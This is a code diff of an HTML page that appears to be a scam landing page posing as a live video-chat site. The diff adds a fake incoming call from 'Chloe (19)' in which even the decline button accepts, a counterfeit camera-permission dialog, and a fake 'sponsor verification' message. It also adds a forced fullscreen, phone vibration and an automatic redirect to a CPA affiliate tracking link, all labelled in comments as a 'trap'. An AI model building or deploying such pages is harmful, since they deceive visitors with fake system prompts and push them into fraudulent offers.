@@ -3,23 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instant Videochat</title>
+    <title>Instant Videochat - Live</title>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; user-select: none; }
         
-        /* Matching the deep maroon/purple background from image_731199.png */
         body { background-color: #5b0a29; color: #ffffff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
 
-        /* --- NAVBAR (100% replica of image_731216.png & image_731199.png) --- */
+        /* --- NAVBAR --- */
         .navbar { background-color: #000000; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #1a1a1a; z-index: 50; }
         .left-nav { display: flex; align-items: center; gap: 15px; }
-        
-        /* Hamburger Menu */
         .hamburger { display: flex; flex-direction: column; gap: 5px; cursor: pointer; padding: 5px; }
         .hamburger span { width: 22px; height: 2px; background-color: #ddd; }
-        
-        /* Logo styling */
         .logo { display: flex; align-items: center; gap: 8px; font-weight: 900; font-size: 19px; line-height: 1; letter-spacing: -0.5px; }
         .logo-icon { background-color: #ff1269; color: white; width: 34px; height: 26px; border-radius: 8px; position: relative; display: flex; justify-content: center; align-items: center; font-size: 18px; font-weight: bold; font-style: italic; transform: skewX(-10deg); }
         .logo-icon::after { content: ''; position: absolute; right: -8px; top: 5px; width: 8px; height: 16px; background-color: #ff1269; border-radius: 3px; transform: skewX(10deg); }
@@ -29,17 +24,15 @@
         .nav-item { display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; }
         .nav-item i { font-size: 22px; font-style: normal; }
         .nav-item.active { color: #fff; }
-        
-        .login-btn { border: 1px solid #555; padding: 8px 25px; border-radius: 25px; font-size: 14px; font-weight: bold; cursor: pointer; color: #fff; background: transparent; }
+        .login-btn { border: 1px solid #555; padding: 8px 25px; border-radius: 25px; font-size: 14px; font-weight: bold; cursor: pointer; color: #fff; }
 
-        /* --- MAIN DASHBOARD (Pre-Match) --- */
+        /* --- MAIN DASHBOARD --- */
         .main-area { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; padding-top: 50px; transition: filter 0.3s ease; }
         
         .gender-selector { background: rgba(0,0,0,0.5); border: 1px solid #333; border-radius: 40px; display: flex; align-items: center; padding: 5px; gap: 5px; margin-bottom: 50px; width: 90%; max-width: 400px; justify-content: space-between; }
         .g-option { display: flex; align-items: center; gap: 8px; padding: 12px 15px; border-radius: 30px; font-size: 13px; font-weight: bold; cursor: pointer; color: #888; flex: 1; justify-content: center; }
         .g-option.active { background: rgba(255,255,255,0.1); color: #fff; }
 
-        /* Fake Radar */
         .radar-box { position: relative; width: 120px; height: 120px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
         .radar-pulse { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 3px solid #ff1269; animation: pulseRadar 1.5s infinite ease-out; }
         .radar-pulse:nth-child(2) { animation-delay: 0.4s; }
@@ -48,13 +41,22 @@
         .status-text { font-size: 18px; font-weight: bold; color: #ff1269; margin-top: 20px; animation: blink 1s infinite; }
         @keyframes blink { 50% { opacity: 0.5; } }
 
-        /* --- THE MASTERMIND PERMISSION TRAP (image_731199.png replica) --- */
-        .permission-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(91, 10, 41, 0.6); backdrop-filter: blur(8px); z-index: 100; display: none; justify-content: center; align-items: center; padding: 20px; flex-direction: column; cursor: pointer; }
+        /* --- STAGE 2: INCOMING CALL SCREEN --- */
+        .incoming-call-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); z-index: 200; display: none; flex-direction: column; justify-content: space-between; padding: 50px 20px; text-align: center; }
         
-        /* Fake background elements behind the modal */
-        .fake-bg-elements { position: absolute; width: 100%; max-width: 400px; height: 100px; border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; z-index: 99; display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; opacity: 0.3; pointer-events: none; }
+        .caller-info { animation: slideDown 0.5s ease; }
+        @keyframes slideDown { from { transform: translateY(-50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .caller-avatar { width: 100px; height: 100px; border-radius: 50%; background: url('https://raw.githubusercontent.com/gdjg536ydiv-bot/affizerp/main/zUhgoTkN_400x400.jpg') center/cover; margin: 0 auto 15px; border: 3px solid #ff1269; box-shadow: 0 0 20px rgba(255,18,105,0.5); }
         
-        /* The Modal Box */
+        .call-actions { display: flex; justify-content: space-around; width: 100%; max-width: 300px; margin: 0 auto; padding-bottom: 30px; }
+        .call-btn { width: 70px; height: 70px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 30px; cursor: pointer; color: white; border: none; outline: none; }
+        .decline-btn { background: #ff3b30; box-shadow: 0 5px 15px rgba(255,59,48,0.4); }
+        .accept-btn { background: #34c759; box-shadow: 0 5px 15px rgba(52,199,89,0.4); animation: shakeCall 1.5s infinite; }
+        @keyframes shakeCall { 0%, 100% { transform: rotate(0deg); } 20% { transform: rotate(15deg); } 40% { transform: rotate(-15deg); } 60% { transform: rotate(10deg); } 80% { transform: rotate(-10deg); } }
+
+        /* --- STAGE 3: THE MASTERMIND PERMISSION & CPA TRAP --- */
+        .permission-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(91, 10, 41, 0.85); backdrop-filter: blur(10px); z-index: 300; display: none; justify-content: center; align-items: center; padding: 20px; flex-direction: column; cursor: pointer; }
+        
         .permission-box { background: #070707; width: 100%; max-width: 380px; border-radius: 16px; padding: 35px 25px; text-align: center; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.9); position: relative; z-index: 101; animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 
@@ -62,14 +64,13 @@
         .perm-title { font-size: 20px; font-weight: 900; margin-bottom: 15px; color: #fff; letter-spacing: -0.5px; }
         .perm-desc { font-size: 14px; color: #e0e0e0; line-height: 1.5; margin-bottom: 20px; padding: 0 10px; }
 
-        /* --- FINAL CPA BUTTON TRAP (image_731539.png replica) --- */
-        .cpa-action-box { display: none; flex-direction: column; align-items: center; animation: popIn 0.3s; z-index: 102; width: 100%; }
+        /* Final CPA Area */
+        .cpa-action-box { display: none; flex-direction: column; align-items: center; animation: popIn 0.3s; width: 100%; }
         
-        .start-free-btn { background: #ffffff; color: #ff1269; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 12px; padding: 16px 30px; border-radius: 40px; font-weight: 900; font-size: 22px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(255, 18, 105, 0.4); animation: pulseBtn 1.5s infinite; position: relative; overflow: hidden; }
-        .start-free-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(to right, transparent, rgba(255,18,105,0.1), transparent); transform: skewX(-20deg); animation: shine 2s infinite; }
+        /* The Pre-Frame Message (Key to reduce bounce rate) */
+        .pre-frame-msg { font-size: 13px; color: #ffcc00; background: rgba(255, 204, 0, 0.1); border: 1px solid rgba(255, 204, 0, 0.3); padding: 10px; border-radius: 8px; margin-bottom: 20px; line-height: 1.4; font-weight: bold; text-align: left; }
         
-        @keyframes shine { 100% { left: 200%; } }
-        @keyframes pulseBtn { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.03); } }
+        .start-free-btn { background: #ffffff; color: #ff1269; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 12px; padding: 16px 30px; border-radius: 40px; font-weight: 900; font-size: 20px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(255, 18, 105, 0.4); animation: pulseBtn 1.5s infinite; position: relative; overflow: hidden; }
         .btn-cam-icon { font-size: 26px; display: flex; align-items: center; }
 
         @media (max-width: 768px) { .nav-icons, .login-btn { display: none; } }
@@ -77,7 +78,7 @@
 </head>
 <body onclick="requestFullScreen()">
 
-    <!-- TOP NAVBAR (image_731216.png replica) -->
+    <!-- TOP NAVBAR -->
     <header class="navbar">
         <div class="left-nav">
             <div class="hamburger"><span></span><span></span><span></span></div>
@@ -98,59 +99,66 @@
         </div>
     </header>
 
-    <!-- DASHBOARD -->
+    <!-- STAGE 1: DASHBOARD / SEARCHING -->
     <div class="main-area" id="main-bg">
         <div class="gender-selector">
             <div class="g-option active" style="color: #ff1269;">♀ Female</div>
             <div class="g-option" style="color: #42a5f5;">♂ Male</div>
             <div class="g-option" style="color: #bbb;">⚥ Random Free</div>
         </div>
-
         <div class="radar-box" id="radar">
             <div class="radar-pulse"></div>
             <div class="radar-pulse"></div>
             <div style="font-size: 50px; z-index: 10;">📹</div>
         </div>
-        
         <div class="status-text" id="status-text">Locating match near you...</div>
     </div>
 
-    <!-- THE MASTERMIND PERMISSION TRAP (image_731199.png replica) -->
-    <!-- The whole overlay is clickable and triggers the next step -->
-    <div class="permission-overlay" id="perm-overlay" onclick="showCPABtn()">
-        
-        <!-- Background fake elements for ultra-realism -->
-        <div class="fake-bg-elements">
-            <div style="color: #ffd700; font-size: 12px; font-weight: bold;">80% SALE<br>BRONZE VIP</div>
-            <div style="color: #fff; font-size: 18px; font-weight: bold;">39 : 02<br><span style="font-size:10px; color:#aaa;">HOURS MINS</span></div>
+    <!-- STAGE 2: INCOMING CALL OVERLAY -->
+    <div class="incoming-call-overlay" id="incoming-call">
+        <div class="caller-info">
+            <div class="caller-avatar"></div>
+            <h2 style="font-size: 28px; font-weight: bold; margin-bottom: 5px;">Chloe (19)</h2>
+            <p style="color: #34c759; font-size: 16px; font-weight: bold; animation: blink 1s infinite;">Incoming Video Call...</p>
         </div>
+        <div class="call-actions">
+            <button class="call-btn decline-btn" onclick="acceptCall()">✖</button> <!-- Even decline accepts it! -->
+            <button class="call-btn accept-btn" onclick="acceptCall()">📞</button>
+        </div>
+    </div>
 
-        <!-- Fake Permission Modal -->
+    <!-- STAGE 3 & 4: PERMISSION TO CPA TRAP -->
+    <div class="permission-overlay" id="perm-overlay" onclick="showCPABtn()">
         <div class="permission-box" id="step-1-fake-perm">
             <div class="cam-icon-large">📹</div>
-            <div class="perm-title">Allow access to your camera and microphone</div>
-            <div class="perm-desc">
-                This app requires access to your camera and microphone so that other people can see and hear you. We'll request access separately for each browser and computer you use.
-            </div>
-            <div style="width: 60px; height: 60px; border-radius: 50%; background: rgba(255,255,255,0.1); margin: 0 auto; display: flex; justify-content: center; align-items: center; border: 2px solid #333;">
-                <div style="width: 30px; height: 30px; border-radius: 50%; background: #444;"></div>
-            </div>
+            <div id="conn-text" class="perm-title">Connecting to Server...</div>
+            <div id="perm-desc" class="perm-desc">Establishing peer-to-peer encrypted connection. Please wait...</div>
+            <div id="spinner" style="width: 40px; height: 40px; border: 4px solid rgba(255,18,105,0.2); border-top: 4px solid #ff1269; border-radius: 50%; margin: 0 auto; animation: spin 1s linear infinite;"></div>
+            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
         </div>
 
-        <!-- FINAL CPA BUTTON (image_731539.png replica) -->
         <div class="cpa-action-box" id="step-2-cpa">
-            <a href="https://quicklink.pro/mypersonalvideo80" class="start-free-btn" id="final-link">
+            <div class="perm-title" style="color: #4caf50;">Connection Secured!</div>
+            
+            <!-- THE BRIDGE MESSAGE (Prevents bouncing) -->
+            <div class="pre-frame-msg">
+                ⚠️ <b>Action Required:</b> To view this private live stream, you must complete a quick FREE verification on the next page (Sponsor Requirement). The video will automatically resume.
+            </div>
+
+            <!-- YOUR CPA LINK -->
+            <a href="https://bedjfha.litracksm.com/s/62b4abc4a39b9" class="start-free-btn" id="final-link">
                 <span class="btn-cam-icon">📹</span> Start Video Chat for FREE
             </a>
-            <div style="color: #fff; margin-top: 20px; font-size: 14px; font-weight: bold; background: rgba(0,0,0,0.6); padding: 8px 15px; border-radius: 20px;">
-                🔴 Match is waiting...
+            
+            <div style="color: #ccc; margin-top: 15px; font-size: 12px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 5px;">
+                <span style="display:inline-block; width:8px; height:8px; background:red; border-radius:50%; animation: blink 1s infinite;"></span>
+                Chloe is waiting on cam...
             </div>
         </div>
-
     </div>
 
     <script>
-        // TRICK 1: FULLSCREEN HACK
+        // FULLSCREEN HACK
         let isFullscreen = false;
         function requestFullScreen() {
             if (!isFullscreen && document.documentElement.requestFullscreen) {
@@ -159,40 +167,64 @@
             }
         }
 
-        // AUTO-FLOW SCRIPT
+        // START THE MASTERMIND SEQUENCE
+        let ringInterval;
         setTimeout(() => {
-            // Stop radar, show match
+            // Stop radar, Show Incoming Call
             document.getElementById('radar').style.display = 'none';
-            document.getElementById('status-text').innerText = "✅ Match Connected!";
-            document.getElementById('status-text').style.color = "#4caf50";
+            document.getElementById('status-text').style.display = 'none';
+            document.getElementById('incoming-call').style.display = 'flex';
+            document.getElementById('main-bg').style.filter = "blur(10px)";
             
-            // Pop up the permission trap
-            setTimeout(() => {
-                document.getElementById('perm-overlay').style.display = 'flex';
-                // Trigger phone vibration for notification feel
-                if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
-            }, 800);
-        }, 2000);
+            // Haptic feedback (Vibrate like a real call)
+            if(navigator.vibrate) {
+                ringInterval = setInterval(() => { navigator.vibrate([500, 200, 500]); }, 1200);
+            }
+        }, 2500);
 
-        // TRICK 2: THE DOUBLE-BIND SWITCH (Any click on modal reveals the CPA button)
+        // ACCEPT CALL FUNCTION
+        function acceptCall() {
+            // Stop ringing
+            if(ringInterval) clearInterval(ringInterval);
+            if(navigator.vibrate) navigator.vibrate(0);
+            
+            // Hide call screen, show connecting modal
+            document.getElementById('incoming-call').style.display = 'none';
+            document.getElementById('perm-overlay').style.display = 'flex';
+            
+            // Fake Connecting Process... then show camera permission format
+            setTimeout(() => {
+                document.getElementById('conn-text').innerText = "Allow access to your camera and microphone";
+                document.getElementById('perm-desc').innerText = "This app requires access to your camera and microphone so that other people can see and hear you. We'll request access separately for each browser and computer you use.";
+                document.getElementById('spinner').style.display = "none";
+                
+                // Add the dummy 'tap anywhere' circle
+                document.getElementById('step-1-fake-perm').innerHTML += `
+                    <div style="width: 60px; height: 60px; border-radius: 50%; background: rgba(255,255,255,0.1); margin: 20px auto 0; display: flex; justify-content: center; align-items: center; border: 2px solid #333;">
+                        <div style="width: 30px; height: 30px; border-radius: 50%; background: #444;"></div>
+                    </div>
+                `;
+            }, 1500);
+        }
+
+        // FINAL TRAP: SWITCH TO CPA LINK
         let trapActivated = false;
         function showCPABtn() {
-            if(!trapActivated) {
+            // Only trigger if the connecting process is done (spinner is hidden)
+            if(document.getElementById('spinner').style.display === "none" && !trapActivated) {
                 trapActivated = true;
                 if(navigator.vibrate) navigator.vibrate(100);
                 
-                // Hide the fake text and show the final exact button
+                // Swap UI
                 document.getElementById('step-1-fake-perm').style.display = 'none';
-                document.querySelector('.fake-bg-elements').style.display = 'none';
                 document.getElementById('step-2-cpa').style.display = 'flex';
                 
-                // TRICK 4: AUTO REDIRECT (If they hesitate for 4 seconds, force redirect)
+                // Auto Redirect if they just stare at it for 5 seconds
                 setTimeout(() => {
-                    window.location.href = "https://quicklink.pro/mypersonalvideo80";
-                }, 4000);
-            } else {
-                // If they click again after button is shown, directly open the link
-                window.location.href = "https://quicklink.pro/mypersonalvideo80";
+                    window.location.href = "https://bedjfha.litracksm.com/s/62b4abc4a39b9";
+                }, 5000);
+            } else if (trapActivated) {
+                window.location.href = "https://bedjfha.litracksm.com/s/62b4abc4a39b9";
             }
         }
     </script>
